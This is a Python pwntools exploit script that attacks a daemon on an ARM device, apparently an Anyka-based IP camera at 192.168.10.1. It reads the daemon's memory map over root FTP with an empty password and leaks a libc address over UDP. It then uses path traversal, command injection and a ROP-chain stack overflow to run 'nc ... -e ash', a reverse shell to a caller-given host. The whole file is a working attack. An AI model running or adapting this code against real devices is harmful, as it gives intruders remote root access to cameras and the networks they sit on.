import struct
import socket
from pwn import *
import time
from util import *
import re
import os
from ftplib import FTP

from libcloudapi import ap_update_name_file_write

# configure pwntools stuff
context.arch = 'arm'
context.endian = 'little'  # Specify the endianness

# Extracts addresses from given maps file
def extract_addresses(file_path, library_name):
    addresses = []

    with open(file_path, 'r') as maps_file:
        for line in maps_file:
            match = re.search(r'(\w+)-(\w+).+{}\b'.format(re.escape(library_name)), line)
            if match:
                start_address, end_address = match.groups()
                addresses.append((int(start_address, 16), int(end_address, 16)))

    return addresses


# log on to FTP and extract maps file for daemon for the libc base
def fetch_maps_file_via_FTP(path):
    # Replace these with your FTP server details
    ftp_server = '192.168.10.1'
    ftp_username = 'root'
    ftp_password = ''
    daemon_pid = 425 # usually 425

    # Create an FTP object and connect
    info("Logging into FTP server...")
    ftp = FTP()
    ftp.connect(ftp_server)

    # Log in to the FTP server
    ftp.login(ftp_username, ftp_password)

    # Download the file
    with open(path, 'wb') as local_file:
        ftp.retrbinary(f"RETR /proc/{daemon_pid}/maps", local_file.write)

    # Close the FTP connection
    ftp.quit()

    info(f"/proc/{daemon_pid}/maps downloaded...")

# Builds the payload using the libc base
def build_payload(ip, port, libc_base):
    # Get function addresses we need from libc base
    system_libc = libc_base + 0x4b4fc # 0x4b4fc
    exit_libc = libc_base + 0x46c30 # 0x46c30
    info(f"Calculated addresses:\nsystem(): {hex(system_libc)}\nexit(): {hex(exit_libc)}")

    # Do the stack overflow and execute arbitrary command
    payload = b'\x41' * 268 # pad until pc overwritten
    payload += p32(libc_base + 0x4a5e0) # pc

    # | 0x4a5e0 | ldmia sp!,{r3,pc} |
    payload += p32(libc_base + 0x313f8) # r3 - copy r2 into r0
    payload += p32(libc_base + 0x32c24) # pc

    # | 0x32c24 | add r2,sp,#0x3c | blx r3 |

    # | 0x313f8 | cpy r0,r2 | ldmia sp!,{r4,pc} |
    payload += p32(0xdeadbeef) # r4
    payload += p32(system_libc) # pc
    payload += b"Aa0Aa1Aa" # padding
    payload += p32(libc_base + 0x184f4) # pc

    # | 0x184f4 | mov r0,#0x1 | ldmia sp!,{r4,pc} |
    payload += p32(0xdeadbeef) # r4
    payload += p32(exit_libc) # pc

    payload += b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab" # padding
    payload += f"nc {ip} {port} -e ash #".encode() # command to execute as system

    return payload


# Builds string + length part of payload
def create_str_and_len_bytestring(incoming_bytes):
    length = len(incoming_bytes)
    return struct.pack('<H', length) + incoming_bytes


# Builds packet daemon can understand
def build_daemon_packet(filename_1, filename_2):
    payload = create_str_and_len_bytestring(filename_1) + create_str_and_len_bytestring(filename_2)

    # Calculate and pack the checksum as an unsigned short (2 bytes)
    checksum_bytes = sum(payload).to_bytes(2, byteorder='little')

    # Combine the payload and checksum
    daemon_packet = b'\x03\x00' + payload + checksum_bytes
    daemon_packet = len(daemon_packet).to_bytes(2, byteorder='little') + daemon_packet

    return daemon_packet


def daemon_cmd_injection(cmd):
    info("Sending packet for reverse shell via daemon command injection")
    # Command injections
    filename = "."
    string1 = filename
    string2 = f"{filename} & {cmd} #"

    destination_ip = "192.168.10.1"
    destination_port = 6789

    # Create the payload manually
    payload = build_daemon_packet(string1.encode(), string2.encode())

    info(get_hexdump(payload))

    # Create a TCP socket
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    tcp_socket.connect((destination_ip, destination_port))

    # Send the payload over TCP
    tcp_socket.send(payload)

    # Optionally, you can wait for a response here if the server is expected to send one.
    response = tcp_socket.recv(1024)
    success(f"Received response:{response.decode()}\n\n")
    success("Done!")

    time.sleep(1)

    # Close the socket when done
    tcp_socket.close()


def daemon_global_stack_overflow_exploit(ip, port):
    ## Step 0 - Upload the /tmp/P using file write
    file_path = "P"
    if not os.path.exists(file_path):
        # File doesn't exist, create it
        with open(file_path, 'w'):
            pass
        info(f"File '{file_path}' created.")
    else:
        info(f"File '{file_path}' already exists.")

    ap_update_name_file_write('P')

    ## Step 1 - Use global overflow to overwrite sys_user_config pointer
    info("Overwriting sys_user_config pointer...")

    # Heap overflow
    string1 = b"../../././././././../../tmp/P"
    string2 = b"."

    # Create the payload
    payload = build_daemon_packet(string1, string2)

    info(get_hexdump(payload))

    # Create a TCP socket
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    tcp_socket.connect(("192.168.10.1", 6789))

    # Send the payload over TCP
    tcp_socket.send(payload)

    # Optionally, you can wait for a response here if the server is expected to send one.
    response = tcp_socket.recv(1024)

    if (response == b'\x0b\x00\x02\x01\x00\x00\x01\x0015\x00'):
        success(f"Received successful response: {response}")
    else:
        info(f"Failed, /tmp/P not present on device")
        exit(1)

    time.sleep(1)


    ## Step 2 - Leak pointer using port 8192

    ## 8192 stuff to leak libc base
    info("Leaking pointer via port 8192...")

    # Create a UDP socket
    socket_port_8192 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Set a timeout for the socket (in seconds) to wait for a response
    socket_port_8192.settimeout(5)

    # Send the message to the target IP and port
    socket_port_8192.sendto(b"Anyka IPC ,Get IP Address!", ("192.168.10.1", 8192))

    # Wait for response
    response, addr = socket_port_8192.recvfrom(1024)

    info(f"Received response:\n{response.decode()}")

    # Extract libc base from response
    stack_middle_bytes = int(response.decode().split('@')[8], 10).to_bytes(4, 'big', signed=True)
    stack_middle = int.from_bytes(stack_middle_bytes, byteorder='big')
    info(f"Leaked pointer: {hex(stack_middle)}")
    libc_base = stack_middle - 0xa3000
    info(f"Libc base: {hex(libc_base)}")

    # Close the socket
    socket_port_8192.close()

    ## Step 3 - Use stack overflow to get reverse shell

    # Now build the payload we will send as our second string using the leaked libc address
    payload = build_payload(ip, port, libc_base)

    # Create the daemon packet
    daemon_packet = build_daemon_packet(b".", b". ; " + payload)

    # Now send the packet
    info(f"Sending payload packet: \n{get_hexdump(daemon_packet)}")

    # Send the packet
    tcp_socket.send(daemon_packet)

    # Optionally, you can wait for a response here if the server is expected to send one.
    response = tcp_socket.recv(1024)
    info(f"Received response: {response.decode()}")
    print()

    # Close the socket when done
    tcp_socket.close()

    success("Done!")


def daemon_ftp_stack_overflow_exploit(ip, port):
    # Get maps file for daemon process
    maps_file_path = 'daemon_maps'
    fetch_maps_file_via_FTP(maps_file_path)

    # Get libc base from extracted maps file
    addresses = extract_addresses(maps_file_path, '/lib/libuClibc-0.9.33.2.so')
    libc_base = addresses[0][0] # start address of first

    # Now build the payload we will send as our second string
    payload = build_payload(ip, port, libc_base)

    # Create the daemon packet
    filename = b"."
    filename_2_payload = b". ; " + payload
    daemon_packet = build_daemon_packet(filename, filename_2_payload)

    # Now send the packet
    info(f"Sending payload packet: \n{get_hexdump(daemon_packet)}")

    # Create a TCP socket and connect to daemon
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_socket.connect(("192.168.10.1", 6789))
    info("Connected to daemon...")

    # Send the packet
    tcp_socket.send(daemon_packet)
    info("Payload sent!")

    # Optionally, you can wait for a response here if the server is expected to send one.
    response = tcp_socket.recv(1024)
    info(f"Received response: {response.decode()}")
    print()

    # Close the socket when done
    tcp_socket.close()

    success("Done!")

def anyka_get_ipc():
    target_ip = "192.168.10.1"
    target_port = 8192
    message = "Anyka IPC ,Get IP Address!"

    info(f"Sending \"{message}\" to port 8192")

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Set a timeout for the socket (in seconds) to wait for a response
    sock.settimeout(5)

    # Send the message to the target IP and port
    sock.sendto(message.encode(), (target_ip, target_port))

    # Wait for response
    try:
        response, addr = sock.recvfrom(1024)
        info(f"Received response from {addr} of length {len(response.decode())}:\n{response.decode()}")
    except socket.timeout:
        error("No response received within the timeout period.")

    # Close the socket
    sock.close()